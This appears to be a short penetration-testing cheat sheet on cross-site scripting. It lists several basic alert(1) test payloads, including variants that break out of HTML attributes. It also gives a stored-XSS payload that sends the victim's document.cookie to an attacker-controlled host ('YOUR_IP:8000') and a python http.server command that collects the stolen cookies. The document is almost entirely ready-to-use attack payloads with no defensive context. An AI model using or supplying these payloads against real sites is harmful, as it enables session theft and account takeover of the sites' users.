## XSS

### Basic Test Payloads
```javascript
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
javascript:alert(1)
<svg onload=alert(1)>
```

### Cookie Stealing (Stored XSS)
```javascript
<script>document.location='http://YOUR_IP:8000/steal?c='+document.cookie</script>

// Catch with:
python3 -m http.server 8000
```

